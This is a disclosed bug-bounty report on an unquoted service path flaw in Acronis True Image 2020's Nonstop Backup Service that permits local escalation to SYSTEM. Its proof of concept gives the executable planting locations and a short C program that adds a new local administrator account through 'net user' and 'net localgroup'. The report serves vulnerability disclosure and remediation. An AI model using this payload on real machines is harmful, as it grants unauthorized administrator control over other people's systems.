# Acronis True Image 2020 Build 22510 Nonstop Backup Service Unquoted service path (privilege escalation)

## Report Details
- **Report ID**: 1083532
- **URL**: https://hackerone.com/reports/1083532
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-01-21T20:01:36.524Z
- **Disclosed**: 2024-08-27T13:49:17.257Z

## Reporter
- **Username**: sanderz31
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
Acronis True Image 2020 Nonstop Backup Service is created with an executable path that contains spaces and isn't enclosed within quotes this leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges.

See screenshot below.

 {F1166932} {F1166937}

## POC

The vunability can be easily exploited by placing a custom executable C:\Program Files (x86)\Common.exe or C:\Program.exe and restarting the computer/service. The executable will be executed with system privileges.

An example code for such application can be creating a new user with Administrator privilegles.

```C
#include <stdlib.h>
// i686-w64-mingw32-gcc adduser.c -o adduser.exe
int main ()
{
int i;
i = system ("net user username P@ssword! /add");
i = system ("net localgroup administrators username /add");
return 0;
}
```

## Recommendations
Add quotes to the path "C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe" instead of C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe

## Impact

privilege escalation on the affected system.

## Attachments
- acronis_service.png
- acronis_exe_fileinfo.png
